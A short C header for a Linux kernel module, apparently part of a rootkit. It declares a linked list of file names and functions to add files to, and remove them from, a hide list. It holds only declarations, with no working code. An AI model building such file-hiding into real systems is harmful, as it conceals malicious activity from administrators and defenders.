#ifndef __IDANM__IDANM_H__
#define __IDANM__IDANM_H__

#include <linux/uaccess.h> /* asmlinkage */

/* Macros */
#define MAX_DIRENT_NAME_LEN 256

struct linked_node
{
    const char *name;
    struct linked_node *next;
};

/* Function prototypes */
void add_file_to_hide(const char *name);
void remove_file_from_list(const char *name);

#endif /* __IDANM__IDANM_H__ */